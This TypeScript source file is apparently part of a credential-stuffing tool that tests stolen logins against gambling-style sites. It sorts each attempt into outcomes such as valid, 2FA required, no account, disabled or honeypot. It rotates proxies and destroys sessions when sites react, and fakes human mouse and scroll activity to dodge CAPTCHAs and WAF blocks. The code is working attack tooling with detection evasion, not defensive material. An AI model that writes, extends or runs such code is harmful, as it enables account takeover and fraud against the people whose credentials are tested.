export type Outcome =
  | "queued"
  | "testing"
  | "success"        // Login flow completed — "VERIFY YOUR PHONE"/"+61" or other terminal success signal
  | "success-unconfirmed" // Login success detected but cashier verification bounced
  | "2FA"            // "AUTHENTICATOR" popup detected — credential is valid, second factor required
  | "noaccount"      // ≥1 password submitted, all attempts incorrect, cashier bounced
  | "permdisabled"   // "been disabled" detected — permanent
  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
  | "skipped"        // Zero passwords submitted this run (no-creds / cooldown).
  //   The reason is carried in SiteStatus.error.
  //   Distinct from "noaccount": no authentication was ever attempted.
  | "N/A"            // Session/page crash
  | "incorrect"      // Password incorrect but account exists
  | "pin-misdirection" // Update your pin misdirection
  | "blocked"        // WAF or hard block
  | "soft_success_failed_cashier" // Blueprint: Login looked successful but cashier bounce disproved it
  | "honeypot";      // Upgrade 6: Identity Verification/Honeypot detected

// Blueprint Q6: Multi-Level Toxic Burn Protocol
// ─────────────────────────────────────────────────────────────────────────────
// Level 1 (CLEAN): Session pooled for reuse, no cleanup needed
//   - queued, testing
// Level 2 (SOFT): Cookie-clear only — session stays alive, no proxy rotation
//   Blueprint golden rule: "NEVER close the browser context — just clear cookies"
//   - noaccount, incorrect, success-unconfirmed, soft_success_failed_cashier, pin-misdirection, skipped
// Level 3 (HARD): Full session destruction + proxy rotation
//   - success, 2FA, permdisabled, tempdisabled, honeypot, blocked, N/A, misdirection
// ─────────────────────────────────────────────────────────────────────────────
const SOFT_TOXIC_OUTCOMES: ReadonlySet<Outcome | string> = new Set([
  "noaccount",
  "incorrect",
  "success-unconfirmed",
  "soft_success_failed_cashier",
  "pin-misdirection",
  "skipped",
]);

type ToxicLevel = "clean" | "soft" | "hard";

/** Returns the toxic level for the row's combined site outcomes.
 *  - "clean": all sites returned non-actionable outcomes (queued/testing)
 *  - "soft":  worst outcome is a soft-toxic (cookie-clear, keep session)
 *  - "hard":  at least one hard-toxic outcome (destroy session + rotate)
 *  If burnOnlyOnPermDisabled is true, ONLY permdisabled triggers "hard". */
function classifyToxicLevel(sites: Record<string, SiteStatus>, burnOnlyOnPermDisabled?: boolean, recycleSessionOnIncorrect?: boolean): ToxicLevel {
  let maxLevel: ToxicLevel = "clean";
  for (const s of Object.values(sites)) {
    if (s.outcome === "queued" || s.outcome === "testing") continue;
    if (burnOnlyOnPermDisabled) {
      if (s.outcome === "permdisabled") return "hard";
      continue;
    }
    // Misdirection stored in error string is always hard
    if (s.error?.startsWith("misdirection:")) return "hard";
    // recycleSessionOnIncorrect keeps noaccount clean (legacy compat)
    if (recycleSessionOnIncorrect && s.outcome === "noaccount") continue;
    // Soft outcomes: cookie-clear only, keep session
    if (SOFT_TOXIC_OUTCOMES.has(s.outcome)) {
      if (maxLevel === "clean") maxLevel = "soft";
      continue;
    }
    // Everything else is hard toxic
    return "hard";
  }
  return maxLevel;
}

// Legacy compat wrapper — returns true for any non-clean level
function _hasAnyToxicOutcome(sites: Record<string, SiteStatus>, burnOnlyOnPermDisabled?: boolean, recycleSessionOnIncorrect?: boolean): boolean {
  return classifyToxicLevel(sites, burnOnlyOnPermDisabled, recycleSessionOnIncorrect) !== "clean";
}

/**
 * Monitors execution speed and network latency to predict CAPTCHA thresholds.
 * If threat level spikes, triggers a humanize() routine.
 */
export class ThreatMonitor {
  private networkLags: number[] = [];
  private lastRequestTime = Date.now();
  private threatScore = 0;

  constructor(private page: Page, private engine: any) {
    page.on('request', () => { this.lastRequestTime = Date.now(); });
    page.on('response', () => {
      const lag = Date.now() - this.lastRequestTime;
      this.networkLags.push(lag);
      if (this.networkLags.length > 10) this.networkLags.shift();
      this.evaluateThreat();
    });
  }

  private evaluateThreat() {
    if (this.networkLags.length < 3) return;
    const avgLag = this.networkLags.reduce((a, b) => a + b, 0) / this.networkLags.length;
    // Spiking latency often precedes CAPTCHAs or blocks
    if (avgLag > 3000) {
      this.threatScore += 10;
    } else {
      this.threatScore = Math.max(0, this.threatScore - 2);
    }

    if (this.threatScore > 30) {
      this.engine.log("WARN", `🚨 [ThreatMonitor] High Threat Score (${this.threatScore}). Triggering humanize() evasive maneuvers...`);
      this.threatScore = 0; // Reset after trigger
      this.humanize().catch((e: any) => {
        try {
          this.engine?.log?.("DEBUG", `ThreatMonitor humanize() failed: ${e?.message ?? String(e)}`);
        } catch { /* intentional */ }
      });
    }
  }

  private async humanize() {
    try {
      // Viewport-aware random scrolling and reading delays with Gaussian jitter
      const vp = this.page.viewportSize() || { width: 1280, height: 720 };
      const moveX = Math.round(Math.max(10, Math.min(vp.width - 10, vp.width * 0.1 + Math.random() * vp.width * 0.6)));
      const moveY = Math.round(Math.max(10, Math.min(vp.height - 10, vp.height * 0.1 + Math.random() * vp.height * 0.6)));
      await this.page.mouse.move(moveX, moveY);
      const scrollDown = Math.round(150 + Math.random() * 300);
      await this.page.mouse.wheel(0, scrollDown);
      await new Promise(r => setTimeout(r, Math.round(800 + Math.random() * 1500)));
      await this.page.mouse.wheel(0, -Math.round(scrollDown * 0.5));
      await new Promise(r => setTimeout(r, Math.round(400 + Math.random() * 800)));
    } catch (e: unknown) {
      try {
        this.engine?.log?.("DEBUG", `ThreatMonitor humanize() exception: ${(e instanceof Error ? e.message : String(e)) ?? String(e)}`);
      } catch { /* intentional */ }
    }
  }
}

/**
 * Watchdog to monitor Playwright Page for 30+ seconds of inactivity (default).
 * Detects hard sleeps and stuck locators and forcefully terminates the session.
 */
export class IdleWatchdog {
  private lastActivity = Date.now();
  private intervalId: NodeJS.Timeout | null = null;
  private isDestroyed = false;

  constructor(private page: Page, private onIdle: () => void, private timeoutMs: number = 30000) {
    this.ping = this.ping.bind(this);

    // Listen to network and navigation events
    page.on('request', this.ping);
    page.on('response', this.ping);
    page.on('framenavigated', this.ping);
    page.on('console', this.ping);

    // Inject client-side mutation observer silently
    page.evaluate(() => {
      try {
        const observer = new MutationObserver(() => {
          console.debug('__wd_ping__');
        });
        observer.observe(document, { childList: true, subtree: true, attributes: true });
      } catch { /* intentional */ }
    }).catch(() => {});

    this.intervalId = setInterval(() => this.check(), 1000);
  }

  ping() {
    if (this.isDestroyed) return;
    this.lastActivity = Date.now();
  }

  check() {
    if (this.isDestroyed) return;
    if (Date.now() - this.lastActivity >= this.timeoutMs) {
      // 🚨 Automatic fallback system: aggressively close the window on 30s timeout
      this.onIdle();
      this.destroy(); // Destroy immediately so we don't spam

      // Forcefully kill the page to break any stuck locators
      this.page.close({ runBeforeUnload: false }).catch(() => {});
      this.page.context().close().catch(() => {});
    }
  }

  destroy() {
    this.isDestroyed = true;
    if (this.intervalId) {
      clearInterval(this.intervalId);
      this.intervalId = null;
    }
    // Remove listeners to avoid memory leaks
    this.page.removeListener('request', this.ping);
    this.page.removeListener('response', this.ping);
    this.page.removeListener('framenavigated', this.ping);
    this.page.removeListener('console', this.ping);
  }
}

